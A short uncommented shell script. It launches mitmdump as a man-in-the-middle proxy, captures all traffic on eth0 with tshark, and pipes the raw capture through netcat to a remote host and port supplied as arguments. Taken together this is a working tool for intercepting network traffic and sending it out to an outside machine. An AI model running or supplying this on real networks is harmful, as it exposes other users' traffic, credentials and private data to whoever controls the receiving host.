#!/bin/sh
mitmdump &
tshark -i eth0 -w - | nc $1 $2 -
